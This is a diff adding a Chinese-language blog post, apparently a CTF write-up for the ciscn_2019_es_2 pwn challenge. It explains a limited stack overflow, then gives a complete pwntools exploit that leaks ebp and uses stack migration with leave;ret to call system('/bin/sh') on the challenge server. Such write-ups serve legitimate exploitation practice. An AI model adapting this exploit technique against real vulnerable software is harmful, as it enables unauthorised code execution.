@@ -1,0 +1,90 @@
+---
+layout: post
+title:  ciscn_2019_es_2
+date:   2021-02-06 00:01:01 +0300
+image:  2021-02-06-birds.jpg
+tags:   [ctf,PWN,ciscn2019,StackMigration]
+---
+
+#### main
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  puts("Welcome, my friend. What's your name?");
+  vul();
+  return 0;
+}
+```
+
+### nul()
+
+```assembly
+int vul()
+{
+  char s; // [esp+0h] [ebp-28h]
+
+  memset(&s, 0, 0x20u);
+  read(0, &s, 0x30u);
+  printf("Hello, %s\n", &s);
+  read(0, &s, 0x30u);
+  return printf("Hello, %s\n", &s);
+}
+```
+
+该函数存在溢出，但是只能溢出0x30-0x28=0x8个字节。常规溢出的话，不能满足我们的要求。
+
+可以看到程序中还有一个hack()函数，但是没有被调用过。
+
+```assembly
+int hack()
+{
+  return system("echo flag");
+}
+```
+
+这里调用了system函数，但是显然system()中的参数对我们来说没用。
+
+我们可以利用栈迁移，将栈迁移到栈上。
+
+通过第一次read(),先泄露出ebp的地址。然后计算偏移量得到要迁移到的栈的地址。
+
+```assembly
+# -*-coding:utf-8-*-
+from pwn import *
+
+io = remote("node3.buuoj.cn",25040)
+
+payload = "a"*0x28
+# 把ebp前面的空间填满，避免下面的print遇到\x00截断，然后顺利得到ebp的地址。
+io.send(payload)
+
+io.recvuntil("Hello, ")
+io.recv(0x28)
+
+ebp = u32(io.recv(0x4))
+print(ebp)
+s = ebp - 0x38
+
+system = 0x8048400
+leave_ret = 0x8048562
+payload = "aaaa"
+# payload将system函数写第一个，
+# 那么在用leave；ret劫持栈的时候要抬高4字节。
+payload += p32(system) + p32(0) + p32(s+0x10) + "/bin/sh"
+payload = payload.ljust(0x28, "\x00")
+# 实现栈迁移
+payload += p32(s) + p32(leave_ret)
+io.sendline(payload)
+
+io.interactive()
+```
+
+这里的0x38
+
+![]({{site.baseurl}}/img/2021-02-06-addr.jpg)
+
+0xffffcfd8-0xffffcfa0=0x38
+
+从而得到变量s在栈上的地址。
